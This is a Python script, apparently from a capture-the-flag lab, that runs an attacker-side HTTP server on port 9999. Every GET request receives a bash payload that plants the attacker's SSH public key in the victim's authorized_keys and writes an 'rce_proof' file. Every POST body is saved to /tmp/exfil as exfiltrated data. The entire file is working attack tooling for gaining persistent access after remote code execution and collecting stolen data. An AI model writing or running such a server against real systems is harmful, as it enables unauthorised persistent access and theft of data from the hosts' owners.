from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import os

PUBKEY = open("/home/kali/Desktop/IRONTHREAD/boxes/Browsed/payload/browsed_key.pub").read().strip()

SHELL_SCRIPT = f"""#!/bin/bash
mkdir -p $HOME/.ssh
echo '{PUBKEY}' >> $HOME/.ssh/authorized_keys
chmod 700 $HOME/.ssh
chmod 600 $HOME/.ssh/authorized_keys
id > /tmp/rce_proof
"""

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        label = urllib.parse.unquote(self.path.strip('/'))
        outdir = "/tmp/exfil"
        os.makedirs(outdir, exist_ok=True)
        safe = label.replace("/", "_").replace("..", "").replace(" ", "_") or "default"
        with open(os.path.join(outdir, safe), 'wb') as f:
            f.write(body)
        print(f"[+] POST /{label} ({length} bytes) from {self.client_address[0]}")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        path = urllib.parse.unquote(self.path.strip('/'))
        print(f"[+] GET /{path} from {self.client_address[0]}")
        # Serve shell script on any GET
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(SHELL_SCRIPT.encode())

    def log_message(self, format, *args):
        pass

print("[*] Listening on 0.0.0.0:9999")
print("[*] Serving SSH key plant script on any GET")
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
